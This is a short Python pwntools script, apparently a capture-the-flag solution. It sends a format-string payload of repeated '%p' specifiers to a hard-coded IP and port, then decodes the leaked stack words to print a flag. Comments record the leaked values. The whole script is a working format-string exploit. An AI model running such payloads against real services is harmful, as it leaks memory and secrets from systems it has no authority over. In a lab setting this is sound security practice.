#!/usr/bin/env python3
import pwn

def remote(host:str, port:int):
    
    p = pwn.remote(host, port)
    p.send(b'%p'*14 + b'\n')
    msg = p.recvall().decode()
    # print(msg)
    # 0xa(nil)
    # 0x7f11dc7bfaa0(nil)
    # 0x7f11dc7d8040
    # 0x7025702570257025
    # 0x7025702570257025
    # 0x7025702570257025
    # 0x70257025
    # 0x7972377b47414c46
    # 0x76316f245f30745f
    # 0x5f43692434385f65
    # 0x535f54406d723066
    # 0x7d2121476e497237
    parts = msg.split('0x')[-5:]
    for part in parts:
        for i in range(len(part), 0, -2):
            print(chr(int(part[i-2:i], 16)), end='')

if __name__ == "__main__":
    remote('140.113.24.241', 30172)
